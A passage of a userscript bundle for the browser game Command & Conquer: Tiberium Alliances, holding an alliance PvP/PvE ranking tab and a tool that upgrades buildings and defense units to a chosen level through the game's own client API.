// ==UserScript==
// @name           Firestorm Alliance Part 1
// @author         chirusoo
// @namespace   https://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @include     https://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @description    Compilado de scrips para la alianza del juego C&C Tiberium //               Lista de contenido : 
//                - Infernal Wrapper (API needed)
//		          - Maelstorm Tools
//                - Tiberium Alliances Zoom
//                - WarChiefs - Tiberium Alliances Combat Simulator
//		          - WarChiefs - Tiberium Alliances Upgrade Base/Defense/Army
//		          - CnCOpt
//		          - MT Basescanner
//		          - Tiberium Alliances PvP/PvE Player Info Mod
//                - C&C TA PvP/PvE Ranking within the Alliance
//                - Tiberium Alliances Info Sticker
//                - Tiberium Alliances Map
// 		          - Tiberium Alliances - New Resource Trade Window
//                - C&C:Tiberium Alliances Coords Button - All
//	              - C&C:TA Dev AddonMainMenu
//		          - C&C: Tiberium Alliances Chat Helper Enhanced
//                - C&C:TA Dev AddonMainMenu
// @namespace      pvp_rank_mod
// @include        https://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @version        1.0
// @icon        http://www.gamelitist.com/press/wp-content/uploads/2011/12/Tiberium-Alliances.jpg
// @grant       none
// ==/UserScript==

/***************************************************************************************************
***************************************************************************************************/

// ==UserScript== 
// @name           C&C TA PvP/PvE Ranking within the Alliance 
// @author         ViolentVin 
// @description    Shows PvP/PvE Ranking of the players alliance in the PlayerWindow  
// @namespace      pvp_rank_mod 
// @include        https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version        1.2 
// @downloadURL   https://userscripts.org/scripts/source/167987.user.js 
// @updateURL     https://userscripts.org/scripts/source/167987.meta.js 
// ==/UserScript== 
 
(function () { 
    var PvpRankMod_main = function () { 
        var allianceId = null; 
        var allianceName = null; 
        var button = null; 
        var general = null; 
        var memberCount = null; 
        var playerInfoWindow = null; 
        var playerName = null; 
        var pvpHighScoreLabel = null; 
        var rowData = null; 
        var tabView = null; 
        var dataTable = null; 
 
        function CreateMod() { 
            try { 
                console.log('PvP/PvE Ranking Mod.'); 
                var tr = qx.locale.Manager.tr; 
                playerInfoWindow = webfrontend.gui.info.PlayerInfoWindow.getInstance(); 
                general = playerInfoWindow.getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[1].getChildren()[0]; 
                tabView = playerInfoWindow.getChildren()[0]; 
                playerName = general.getChildren()[1]; 
 
                // Add button to score tab-page to redirect to score history graph of the player. 
                // ( For my own alliance only ; since only our member scores are logged external. 
                allianceName = ClientLib.Data.MainData.GetInstance().get_Alliance().get_Name(); 
                if (allianceName == 'Oldskool') { 
                    button = new qx.ui.form.Button("Score graph"); 
                    button.addListener("execute", function () { 
 
                        var link = "http://pixaqu.nl/test/tibscoreos.php?user="; 
                        link += playerName.getValue(); 
                        window.open(link, "_blank"); 
                    }); 
                    general.add(button, { 
                        row: 3, 
                        column: 1 
                    }); 
                } 
 
                // New PvP Ranking Tab-page 
                var pvpRankingTab = new qx.ui.tabview.Page("Ranking"); 
                pvpRankingTab.setLayout(new qx.ui.layout.Canvas()); 
                pvpRankingTab.setPaddingTop(6); 
                pvpRankingTab.setPaddingLeft(8); 
                pvpRankingTab.setPaddingRight(10); 
                pvpRankingTab.setPaddingBottom(8); 
 
                // Label PvP Ranking 
                pvpHighScoreLabel = new qx.ui.basic.Label("PvP and PvE for alliance: ").set({ 
                    textColor: "text-value", 
                    font: "font_size_13_bold" 
                }); 
                pvpRankingTab.add(pvpHighScoreLabel); 
 
                // Table to show the PvP Scores of each player 
                dataTable = new webfrontend.data.SimpleColFormattingDataModel().set({ 
                    caseSensitiveSorting: false 
                }); 
                dataTable.setColumns(["Name", "PvP", "PvE" ], ["name", "pve", "pvp" ]); 
                var pvpTable = new webfrontend.gui.widgets.CustomTable(dataTable); 
                var columnModel = pvpTable.getTableColumnModel(); 
                columnModel.setColumnWidth(0, 200); 
                columnModel.setColumnWidth(1, 80); 
                columnModel.setColumnWidth(2, 80); 
                pvpTable.setStatusBarVisible(false); 
                pvpTable.setColumnVisibilityButtonVisible(false); 
                pvpRankingTab.add(pvpTable, { 
                    left: 0, 
                    top: 25, 
                    right: 0, 
                    bottom: 0 
                }); 
 
                // Add Tab page to the PlayerInfoWindow 
                tabView.add(pvpRankingTab); 
 
                // Hook up callback when another user has been selected 
                playerInfoWindow.addListener("close", onPlayerInfoWindowClose, this); 
                playerName.addListener("changeValue", onPlayerChanged, this); 
 
            } catch (e) { 
                console.log("CreateMod: ", e); 
            } 
        } 
 
 
        // Callback GetPublicPlayerInfoByName 
        // [bde] => Forgotten Bases Destroyed 
        // [d] => Player Bases Destroyed 
        // [n] => Player Name 
        function onPlayerInfoReceived(context, data) { 
            try { 
                var memberName = data.n 
                var pvp = data.d; 
                var pve = data.bde; 
                
                // Add player with its PvP/PvE score. 
                rowData.push([memberName, pvp, pve]); 
 
                if (rowData.length == memberCount) { 
                    // Show Alliance name in label. 
                    pvpHighScoreLabel.setValue("PvP and PvE for alliance: " + data.an); 
 
                    dataTable.setData(rowData); 
                    dataTable.sortByColumn(1, false); 
                } 
 
            } catch (e) { 
                console.log("onPlayerInfoReceived: ", e); 
            } 
        } 
 
 
        // GetPublicAllianceInfo Callback 
        // [m] => Member Array 
        // ( 
        //    [0] => Array 
        //            [n] => Name 
        // ) 
        // [mc]  => Member Count 
        function onAllianceInfoReceived(context, data) { 
            try { 
                // Crear  
                rowData = []; 
                dataTable.setData(rowData); 
 
                var members = data.m; 
                memberCount = data.mc; 
 
                for (var i in members) { 
                    var member = members[i]; 
 
                    // For Each member (player); Get the PvP/PvE Score 
                    if (member.n.length > 0) { 
                        ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicPlayerInfoByName", { 
                            name: member.n 
                        }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onPlayerInfoReceived), null); 
                    } 
                } 
            } catch (e) { 
                console.log("onAllianceInfoReceived: ", e); 
            } 
        } 
 
        // Callback GetPublicPlayerInfoByName 
        // [a] => Alliance ID 
        // [an] => Alliance Name 
        function onPlayerAllianceIdReceived(context, data) { 
            try { 
                // No need to recreate the RankingPage when player is member of same alliance 
                if (data.a != allianceId) { 
                    allianceId = data.a; 
 
                    // Show Alliance name in label. 
                    pvpHighScoreLabel.setValue("PvP and PvE for alliance: " + data.an + "     (loading plz wait)"); 
 
                    // Get Alliance MembersList 
                    ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicAllianceInfo", { 
                        id: allianceId 
                    }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onAllianceInfoReceived), null); 
                } 
            } catch (e) { 
                console.log("onPlayerInfoReceived: ", e); 
            } 
        } 
 
 
        function onPlayerChanged() { 
            try { 
                // Get Players AllianceId  
                if (playerName.getValue().length > 0) { 
                    ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicPlayerInfoByName", { 
                        name: playerName.getValue() 
                    }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onPlayerAllianceIdReceived), null); 
                } 
            } catch (e) { 
                console.log("onPlayerChanged: ", e); 
            } 
        } 
 
 
 
        function onPlayerInfoWindowClose() { 
            try { 
                //dataTable.setData([]); 
            } catch (e) { 
                console.log("onPlayerInfoWindowClose: ", e); 
            } 
        } 
 
        function PvpRankMod_checkIfLoaded() { 
            try { 
                if (typeof qx !== 'undefined' && typeof qx.locale !== 'undefined' && typeof qx.locale.Manager !== 'undefined') { 
                    if (ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders() !== null && ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders().l.length != 0) { 
                        CreateMod(); 
                    } else { 
                        window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
                    } 
                } else { 
                    window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
                } 
            } catch (e) { 
                console.log("PvpRankMod_checkIfLoaded: ", e); 
            } 
        } 
 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            window.setTimeout(PvpRankMod_checkIfLoaded, 1000); 
        } 
    } 
 
    try { 
        var PvpRankMod = document.createElement("script"); 
        PvpRankMod.innerHTML = "(" + PvpRankMod_main.toString() + ")();"; 
        PvpRankMod.type = "text/javascript"; 
        if (/commandandconquer\.com/i.test(document.domain)) { 
            document.getElementsByTagName("head")[0].appendChild(PvpRankMod); 
        } 
    } catch (e) { 
        console.log("PvpRankMod: init error: ", e); 
    } 
})();




// ==UserScript== 
// @name            WarChiefs - Tiberium Alliances Upgrade Base/Defense/Army 
// @description     Upgrade your Base,Defense Army to a specific Level. 
// @author          Eistee 
// @version         13.05.15 
// @namespace       http*://*.alliances.commandandconquer.com/* 
// @include         http*://*.alliances.commandandconquer.com/* 
// @require         http://usocheckup.redirectme.net/167564.js 
// @icon            http://s3.amazonaws.com/uso_ss/icon/167564/large.png 
// @updateURL       https://userscripts.org/scripts/source/167564.meta.js 
// @downloadURL     https://userscripts.org/scripts/source/167564.user.js 
// @grant           GM_getValue 
// @grant           GM_log 
// @grant           GM_openInTab 
// @grant           GM_registerMenuCommand 
// @grant           GM_setValue 
// @grant           GM_xmlhttpRequest 
// ==/UserScript== 
(function () { 
    var injectFunction = function () { 
        function createClasses() { 
            qx.Class.define("Upgrade", { 
                type: "singleton", 
                extend: qx.core.Object, 
                construct: function () { 
                    try { 
                        var qxApp = qx.core.Init.getApplication(); 
 
                        this.btnUpgrade = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png").set({ 
                            toolTipText: qxApp.tr("tnf:toggle upgrade mode"), 
                            alignY: "middle", 
                            show: "icon", 
                            width : 60, 
                            allowGrowX : false, 
                            allowGrowY : false, 
                            appearance : "button" 
                        }); 
                        this.btnClick = this.btnUpgrade.addListener("click", this.openBase, this); 
 
                        var playArea = qx.core.Init.getApplication().getPlayArea(); 
                        var btnTrade = playArea.getHUD().getUIItem(ClientLib.Data.Missions.PATH.WDG_TRADE); 
                        btnTrade.getLayoutParent().addAfter(this.btnUpgrade, btnTrade); 
 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "ViewModeChange", ClientLib.Vis.ViewModeChange, this, this.onViewChanged); 
                    } catch (e) { 
                        console.log("Error setting up Upgrade Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
                destruct: function () {}, 
                members: { 
                    btnUpgrade: null, 
                    btnClick: null, 
                    onViewChanged: function (oldMode, newMode) { 
                        this.btnUpgrade.removeListenerById(this.btnClick); 
                        Upgrade.Base.getInstance().close(); 
                        Upgrade.Defense.getInstance().close(); 
                        Upgrade.Army.getInstance().close(); 
                        switch (newMode) { 
                        case ClientLib.Vis.Mode.City: 
                            this.btnUpgrade.show(); 
                            this.btnClick = this.btnUpgrade.addListener("click", this.openBase, this); 
                            break; 
                        case ClientLib.Vis.Mode.DefenseSetup: 
                            this.btnUpgrade.show(); 
                            this.btnClick = this.btnUpgrade.addListener("click", this.openDefense, this); 
                            break; 
                        case ClientLib.Vis.Mode.ArmySetup: 
                            this.btnUpgrade.show(); 
                            this.btnClick = this.btnUpgrade.addListener("click", this.openArmy, this); 
                            break; 
                        default: 
                            this.btnUpgrade.hide(); 
                            break; 
                        } 
                    }, 
                    openBase: function () { 
                        if (Upgrade.Base.getInstance().isVisible()) Upgrade.Base.getInstance().close(); 
                        else Upgrade.Base.getInstance().open(); 
                    }, 
                    openDefense: function () { 
                        if (Upgrade.Defense.getInstance().isVisible()) Upgrade.Defense.getInstance().close(); 
                        else Upgrade.Defense.getInstance().open(); 
                    }, 
                    openArmy: function () { 
                        if (Upgrade.Army.getInstance().isVisible()) Upgrade.Army.getInstance().close(); 
                        else Upgrade.Army.getInstance().open(); 
                    } 
                } 
            }); 
            qx.Class.define("Upgrade.Base", { 
                type: "singleton", 
                extend: qx.ui.window.Window, 
                construct: function () { 
                    try { 
                        var qxApp = qx.core.Init.getApplication(); 
                        this.base(arguments); 
                        this.set({ 
                            layout: new qx.ui.layout.VBox().set({ spacing: 0 }), 
                            caption: qxApp.tr("tnf:toggle upgrade mode") + ": " + qxApp.tr("tnf:base"), 
                            icon: "FactionUI/icons/icon_arsnl_base_buildings.png", 
                            contentPadding: 5, 
                            contentPaddingTop: 0, 
                            allowMaximize: false, 
                            showMaximize: false, 
                            allowMinimize: false, 
                            showMinimize: false, 
                            resizable: false 
                        }); 
                        this.getChildControl("icon").set({ width : 18, height : 18, scale : true, alignY : "middle" }); 
 
                        var cntCurrent = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntCurrent.add(new qx.ui.basic.Label("Upgrade current building").set({ alignX: "center", font: "font_size_14_bold" })); 
                        this.lblCurrent = new qx.ui.basic.Label("Selected building: -"); 
                        cntCurrent.add(this.lblCurrent); 
                        var cntCurrentHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtCurrentNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtCurrentNewLevel.addListener("input", this.onCurrentNewLevelInput, this); 
                        cntCurrentHBox.add(this.txtCurrentNewLevel); 
                        var btnCurrent = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnCurrent.addListener("execute", this.upgradeCurrent, this); 
                        cntCurrentHBox.add(btnCurrent); 
                        cntCurrent.add(cntCurrentHBox); 
                        var cntCurrentRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntCurrentRes.add(this.lblCurrentTib = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_tiberium.png")); 
                        this.lblCurrentTib.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrentRes.add(this.lblCurrentPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblCurrentPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrent.add(cntCurrentRes); 
                        this.add(cntCurrent); 
 
                        var cntAll = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntAll.add(new qx.ui.basic.Label("Upgrade all buildings").set({ alignX: "center", font: "font_size_14_bold" })); 
                        var cntAllHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtAllNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtAllNewLevel.addListener("input", this.onAllNewLevelInput, this); 
                        cntAllHBox.add(this.txtAllNewLevel); 
                        var btnAll = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnAll.addListener("execute", this.upgradeAll, this); 
                        cntAllHBox.add(btnAll); 
                        cntAll.add(cntAllHBox); 
                        var cntAllRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntAllRes.add(this.lblAllTib = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_tiberium.png")); 
                        this.lblAllTib.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAllRes.add(this.lblAllPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblAllPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAll.add(cntAllRes); 
                        this.add(cntAll); 
 
 
                        this.addListener("close", this.onClose, this); 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "SelectionChange", ClientLib.Vis.SelectionChange, this, this.onSelectionChange); 
                    } catch (e) { 
                        console.log("Error setting up Upgrade.Base Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
                destruct: function () {}, 
                members: { 
                    lblCurrent: null, 
                    lblCurrentTib: null, 
                    lblCurrentPow: null, 
                    txtCurrentNewLevel: null, 
                    Current: null, 
                    lblAllTib: null, 
                    lblAllPow: null, 
                    txtAllNewLevel: null, 
                    onClose: function () { 
                            this.lblCurrent.setValue("Selected building: -"); 
                            this.txtCurrentNewLevel.resetValue(); 
                            this.Current = null; 
                            this.txtAllNewLevel.resetValue(); 
                    }, 
                    onSelectionChange: function(oldObj, newObj) { 
                        if (newObj != null && newObj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.CityBuildingType) { 
                            this.Current = newObj; 
                            var name = newObj.get_BuildingName(); 
                            var level = newObj.get_BuildingLevel(); 
                            this.lblCurrent.setValue("Selected building: " + name + " (" + level.toString() + ")"); 
                            this.onCurrentNewLevelInput(); 
                        } 
                    }, 
                    onCurrentNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.CityBuildingType && newLevel > obj.get_BuildingLevel()) { 
                                var costs = ClientLib.API.City.GetInstance().GetUpgradeCostsForBuildingToLevel(obj.get_BuildingDetails(), newLevel); 
                                var Tib = 0; 
                                var Pow = 0; 
                                for (var i = 0; i < costs.length; i++) { 
                                    var uCosts = costs[i]; 
                                    var cType = parseInt(uCosts.Type, 10); 
                                    switch (cType) { 
                                    case ClientLib.Base.EResourceType.Tiberium: 
                                        Tib += uCosts.Count; 
                                        break; 
                                    case ClientLib.Base.EResourceType.Power: 
                                        Pow += uCosts.Count; 
                                        break; 
                                    } 
                                } 
                                this.lblCurrentTib.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Tib)); 
                                this.lblCurrentTib.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Tib)); 
                                this.lblCurrentTib.setToolTipIcon("webfrontend/ui/common/icn_res_tiberium.png"); 
                                if (Tib === 0) this.lblCurrentTib.exclude(); 
                                else this.lblCurrentTib.show(); 
                                this.lblCurrentPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                                this.lblCurrentPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                                this.lblCurrentPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                                if (Pow === 0) this.lblCurrentPow.exclude(); 
                                else this.lblCurrentPow.show(); 
                            } else { 
                                this.lblCurrentTib.setLabel("-"); 
                                this.lblCurrentTib.resetToolTipText(); 
                                this.lblCurrentTib.resetToolTipIcon(); 
                                this.lblCurrentTib.show(); 
                                this.lblCurrentPow.setLabel("-"); 
                                this.lblCurrentPow.resetToolTipText(); 
                                this.lblCurrentPow.resetToolTipIcon(); 
                                this.lblCurrentPow.show(); 
                            } 
                        } else { 
                            this.lblCurrentTib.setLabel("-"); 
                            this.lblCurrentTib.resetToolTipText(); 
                            this.lblCurrentTib.resetToolTipIcon(); 
                            this.lblCurrentTib.show(); 
                            this.lblCurrentPow.setLabel("-"); 
                            this.lblCurrentPow.resetToolTipText(); 
                            this.lblCurrentPow.resetToolTipIcon(); 
                            this.lblCurrentPow.show(); 
                        } 
                    }, 
                    upgradeCurrent: function() { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.CityBuildingType && newLevel > obj.get_BuildingLevel()) { 
                                ClientLib.API.City.GetInstance().UpgradeBuildingToLevel(obj.get_BuildingDetails(), newLevel); 
                                this.onSelectionChange(null, this.Current); 
                            } 
                        } 
                        this.txtCurrentNewLevel.setValue(""); 
                    }, 
                    onAllNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        var costs = ClientLib.API.City.GetInstance().GetUpgradeCostsForAllBuildingsToLevel(newLevel); 
                        if (newLevel > 0 && costs !== null) { 
                            var Tib = 0; 
                            var Pow = 0; 
                            for (var i = 0; i < costs.length; i++) { 
                                var uCosts = costs[i]; 
                                var cType = parseInt(uCosts.Type, 10); 
                                switch (cType) { 
                                case ClientLib.Base.EResourceType.Tiberium: 
                                    Tib += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.Power: 
                                    Pow += uCosts.Count; 
                                    break; 
                                } 
                            } 
                            this.lblAllTib.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Tib)); 
                            this.lblAllTib.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Tib)); 
                            this.lblAllTib.setToolTipIcon("webfrontend/ui/common/icn_res_tiberium.png"); 
                            if (Tib === 0) this.lblAllTib.exclude(); 
                            else this.lblAllTib.show(); 
                            this.lblAllPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                            this.lblAllPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                            this.lblAllPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                            if (Pow === 0) this.lblAllPow.exclude(); 
                            else this.lblAllPow.show(); 
                        } else { 
                            this.lblAllTib.setLabel("-"); 
                            this.lblAllTib.resetToolTipText(); 
                            this.lblAllTib.resetToolTipIcon(); 
                            this.lblAllTib.show(); 
                            this.lblAllPow.setLabel("-"); 
                            this.lblAllPow.resetToolTipText(); 
                            this.lblAllPow.resetToolTipIcon(); 
                            this.lblAllPow.show(); 
                        } 
                    }, 
                    upgradeAll: function() { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        if (newLevel > 0) ClientLib.API.City.GetInstance().UpgradeAllBuildingsToLevel(newLevel); 
                        this.txtAllNewLevel.setValue(""); 
                    } 
                } 
            }); 
            qx.Class.define("Upgrade.Defense", { 
                type: "singleton", 
                extend: qx.ui.window.Window, 
                construct: function () { 
                    try { 
                        var qxApp = qx.core.Init.getApplication(); 
                        this.base(arguments); 
                        this.set({ 
                            layout: new qx.ui.layout.VBox().set({ spacing: 0 }), 
                            caption: qxApp.tr("tnf:toggle upgrade mode") + ": " + qxApp.tr("tnf:defense"), 
                            icon: "FactionUI/icons/icon_def_army_points.png", 
                            contentPadding: 5, 
                            contentPaddingTop: 0, 
                            allowMaximize: false, 
                            showMaximize: false, 
                            allowMinimize: false, 
                            showMinimize: false, 
                            resizable: false 
                        }); 
                        this.getChildControl("icon").set({ width : 18, height : 18, scale : true, alignY : "middle" }); 
 
                        var cntCurrent = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntCurrent.add(new qx.ui.basic.Label("Upgrade current defense unit").set({ alignX: "center", font: "font_size_14_bold" })); 
                        this.lblCurrent = new qx.ui.basic.Label("Selected defense unit: -"); 
                        cntCurrent.add(this.lblCurrent); 
                        var cntCurrentHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtCurrentNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtCurrentNewLevel.addListener("input", this.onCurrentNewLevelInput, this); 
                        cntCurrentHBox.add(this.txtCurrentNewLevel); 
                        var btnCurrent = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnCurrent.addListener("execute", this.upgradeCurrent, this); 
                        cntCurrentHBox.add(btnCurrent); 
                        cntCurrent.add(cntCurrentHBox); 
                        var cntCurrentRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntCurrentRes.add(this.lblCurrentTib = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_tiberium.png")); 
                        this.lblCurrentTib.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrentRes.add(this.lblCurrentCry = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_chrystal.png")); 
                        this.lblCurrentCry.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrentRes.add(this.lblCurrentPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblCurrentPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrent.add(cntCurrentRes); 
                        this.add(cntCurrent); 
 
                        var cntAll = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntAll.add(new qx.ui.basic.Label("Upgrade all defense units").set({ alignX: "center", font: "font_size_14_bold" })); 
                        var cntAllHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtAllNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtAllNewLevel.addListener("input", this.onAllNewLevelInput, this); 
                        cntAllHBox.add(this.txtAllNewLevel); 
                        var btnAll = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnAll.addListener("execute", this.upgradeAll, this); 
                        cntAllHBox.add(btnAll); 
                        cntAll.add(cntAllHBox); 
                        var cntAllRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntAllRes.add(this.lblAllTib = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_tiberium.png")); 
                        this.lblAllTib.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAllRes.add(this.lblAllCry = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_chrystal.png")); 
                        this.lblAllCry.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAllRes.add(this.lblAllPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblAllPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAll.add(cntAllRes); 
                        this.add(cntAll); 
 
                        this.addListener("close", this.onClose, this); 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "SelectionChange", ClientLib.Vis.SelectionChange, this, this.onSelectionChange); 
                    } catch (e) { 
                        console.log("Error setting up Upgrade.Defense Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
                destruct: function () {}, 
                members: { 
                    lblCurrent: null, 
                    lblCurrentTib: null, 
                    lblCurrentCry: null, 
                    lblCurrentPow: null, 
                    txtCurrentNewLevel: null, 
                    Current: null, 
                    lblAllTib: null, 
                    lblAllCry: null, 
                    lblAllPow: null, 
                    txtAllNewLevel: null, 
                    onClose: function () { 
                            this.lblCurrent.setValue("Selected defense unit: -"); 
                            this.txtCurrentNewLevel.resetValue(); 
                            this.Current = null; 
                            this.txtAllNewLevel.resetValue(); 
                    }, 
                    onSelectionChange: function(oldObj, newObj) { 
                        if (newObj != null && newObj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.DefenseUnitType) { 
                            this.Current = newObj; 
                            var name = newObj.get_UnitName(); 
                            var level = newObj.get_UnitLevel(); 
                            this.lblCurrent.setValue("Selected defense unit: " + name + " (" + level.toString() + ")"); 
                            this.onCurrentNewLevelInput(); 
                        } 
                    }, 
                    onCurrentNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.DefenseUnitType && newLevel > obj.get_UnitLevel()) { 
                                var costs = ClientLib.API.Defense.GetInstance().GetUpgradeCostsForUnitToLevel(obj.get_UnitDetails(), newLevel); 
                                var Tib = 0; 
                                var Cry = 0; 
                                var Pow = 0; 
                                for (var i = 0; i < costs.length; i++) { 
                                    var uCosts = costs[i]; 
                                    var cType = parseInt(uCosts.Type, 10); 
                                    switch (cType) { 
                                    case ClientLib.Base.EResourceType.Tiberium: 
                                        Tib += uCosts.Count; 
                                        break; 
                                    case ClientLib.Base.EResourceType.Crystal: 
                                        Cry += uCosts.Count; 
                                        break; 
                                    case ClientLib.Base.EResourceType.Power: 
                                        Pow += uCosts.Count; 
                                        break; 
                                    } 
                                } 
                                this.lblCurrentTib.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Tib)); 
                                this.lblCurrentTib.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Tib)); 
                                this.lblCurrentTib.setToolTipIcon("webfrontend/ui/common/icn_res_tiberium.png"); 
                                if (Tib === 0) this.lblCurrentTib.exclude(); 
                                else this.lblCurrentTib.show(); 
                                this.lblCurrentCry.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Cry)); 
                                this.lblCurrentCry.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Cry)); 
                                this.lblCurrentCry.setToolTipIcon("webfrontend/ui/common/icn_res_chrystal.png"); 
                                if (Cry === 0) this.lblCurrentCry.exclude(); 
                                else this.lblCurrentCry.show(); 
